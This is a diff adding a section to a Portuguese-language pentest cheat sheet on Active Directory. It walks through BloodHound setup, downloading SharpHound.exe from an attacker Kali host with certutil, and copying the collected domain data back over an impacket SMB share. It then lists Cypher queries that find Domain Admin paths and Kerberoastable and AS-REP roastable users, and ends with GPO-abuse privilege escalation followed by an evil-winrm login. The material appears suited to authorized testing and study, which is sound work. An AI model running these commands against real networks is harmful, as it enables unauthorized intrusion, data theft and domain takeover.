@@ -9222,13 +9222,56 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 
 - Bloodhound
 
-Ferarmenta de enumeração do AD
+Ferarmenta de enumeração do AD da instalação à inserção de DADOS
 
 	sudo apt install bloodhound
 	sudo neo4j console
 	ACESSA A WEB http://localhost:7474/ LOGIN: neo4j PASS: neo4j
 	sudo nano /etc/bhapi/bhapi.json PASTE the new password before running bloodhound
 	bloodhound	(AO APARECER A PAGINA WEB LOGAR COM admin:admin)
+		FAZER A COLETA DE INFORMAÇOES
+	cd /opt/boodhound
+	python3 -m http.server 80
+	certutil -f -urlcache http://IP-KALI/SharpHound.exe SharpHound.exe
+	SharpHound.exe -c all -d floripa.local --zipfilename floripa.local
+	EXEMPLO SIMPLES: impacket-smbserver tmp .
+	EXEMPLO SIMPLES: copy floripa.local \\IP-KALI\tmp
+	impacket-smbserver -smb2support -username kali -password kali tmp . 
+	net use x: \\IP-KALI\tmp /user:kali kali
+	copy floripa.local x:\
+	Insert data inside bloodhound
+	CONSULTA NO BLOODHOUND
+	MATCH (x:User)WHERE exists(x:description) RETURN x PROCURA POR TODOS OS USUARIOS EXISTENTES NAS BASES
+	MATCH (x:Computer) RETURN x
+	MATCH (U:User)
+	MATCH (G:Group {name:'ADMINISTARTORS@FLORIPA.LOCAL'})
+	MATCH (U)-[MemberOf]->(G) RETURN (U)
+	MATCH (c:Computer)-[:MemberOf]->(g:Group) WHERE g.objectsid ENDS WITH "-516" RETURN g.name, COLLECT(c.name) -> Encontrar Controladores de Domínio
+	MATCH (c:Computer {unconstraineddelegation: true}) RETURN c.name -> Listar Computadores com Unconstrained Delegation
+	MATCH (d:Domain) RETURN d -> Listar Todos os Domínios Importados
+	MATCH (g1:Group)<-[:MemberOf*1..]-(u)-[:MemberOf*1..]->(g2:Group) WHERE g1 <> g2 RETURN g1.name, g2.name, COLLECT(u.name) -> Encontrar Interseção de Membros entre Grupos
+	MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"})<-[:MemberOf*1..]-(u) RETURN u.name -> Localizar Todos os Membros do Domain Admins (Diretos e Aninhados)
+	MATCH p=(n)-[:GenericAll|:GenericWrite|:WriteDacl|:WriteOwner|:Owns]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"}) RETURN p -> Mostrar Todas as ACLs Diretas no Grupo Domain Admins
+	MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"})) RETURN p -> Encontrar Caminhos Mais Curtos para o Domínio Admin
+	MATCH p=(u:User)-[:MemberOf|:HasSession|:AdminTo|:CanRDP|:CanPSRemote|:ExecuteDCOM*1..3]->(c:Computer) WHERE c.operatingsystem CONTAINS "Server" RETURN DISTINCT u.name -> Encontrar Usuários com Acesso a Servidores em até 3 Saltos
+	MATCH p=(u:User)-[:Owns]->(n) RETURN p -> Verificar "Owns" (Propriedade) Direta de Objetos
+	MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name -> Mostrar Relações de AdminTo (Administradores Locais)
+	MATCH (u:User)-[:CanPSRemote]->(c:Computer) RETURN u.name, COLLECT(c.name) -> Listar Usuários com Direitos de PowerShell Remoto
+	MATCH (u:User)-[:CanRDP]->(c:Computer) RETURN u.name, COLLECT(c.name) -> Listar Usuários com Direitos de RDP para Computadores
+	MATCH (u:User {dontreqpreauth: true}) RETURN u.name -> Listar Usuários sem Pré-Autenticação Kerberos (AS-REP Roasting)
+	MATCH (u:User {enabled: true}) RETURN COUNT(u) -> Contar Todos os Usuários Habilitados no Domínio
+	MATCH (u:User)-[:ExecuteDCOM]->(c:Computer) RETURN u.name, COLLECT(c.name) -> Listar Usuários com Permissão DCOM em Computadores
+	MATCH (u:User)-[:HasSession]->(c:Computer)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.COM"}) RETURN u.name, c.name -> Encontrar Usuários Logados em Computadores que são Domain Admins
+	MATCH (u:User)-[:HasSession]->(c:Computer) RETURN u.name, c.name -> Encontrar Usuários com Sessões Ativas
+	MATCH (u:User {hasspn: true}) RETURN u.name, u.serviceprincipalnames -> Encontrar Usuários Kerberoastable (Com SPNs)
+	MATCH (u:User)-[:MemberOf]->(g:Group) WHERE g.objectsid ENDS WITH "-525" RETURN g.name, COLLECT(u.name) -> Listar Grupos com SID Histórico (Possível ACL Attack)
+	MATCH (u:User)-[:SQLAdmin]->(c:Computer) RETURN u.name, c.name -> Listar Administradores SQL em Computadores
+		ESCALANDO PRIVILEGIOS COM UMA GPO
+	Adicionar o DOMAIN em hosts e ATUALIZAR A HORA COM O AD
+	cd /opt/pyGPOAbuse
+	python3 pygpoabuse.py SUB.DOMAIN.LOCAL/USER:'pass' -gpo-id "ID-DA-GPO-CAP-NO-BLOODHOUND"
+	ESPERAR O TEMPO DA GPO OU FORÇAR
+	evil-winrm -i SUB.DOMAIN.LOCAL -u jhn -p H4x00r123..
 
 
 ATAQUES GERAIS AO SMB
